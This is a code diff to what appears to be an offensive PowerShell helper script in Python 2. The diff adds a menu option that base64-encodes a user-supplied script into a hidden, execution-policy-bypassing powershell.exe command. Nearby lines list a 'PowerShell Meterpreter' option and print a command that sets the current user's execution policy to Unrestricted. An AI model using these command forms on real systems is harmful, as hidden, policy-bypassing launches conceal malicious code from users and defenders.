@@ -145,7 +145,8 @@ while ans:
                 	4.PowerShell Meterpreter
                 	5.Change Users Execution Policy
                 	6.Powershell 101
-                	7.Exit/Quit
+                	7.Base64 Encode a PowerShell Script
+                	8.Exit/Quit
     """)
 	ans=raw_input("What would you like to do: ") 
 	if ans=="1":
@@ -161,6 +162,10 @@ while ans:
 		print 'This will permanently change the current users execution policy:'
 		print 'powershell -exec bypass -noninteractive -w hidden -Command "& {Set-ExecutionPolicy Unrestricted -Scope CurrentUser}"'
 	elif ans=="6":
-		p101()	
+		p101()
 	elif ans=="7":
+		code=raw_input("PowerShell Script to Encode:")
+		print code 
+		print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(code)
+	elif ans=="8":
 		sys.exit(0)
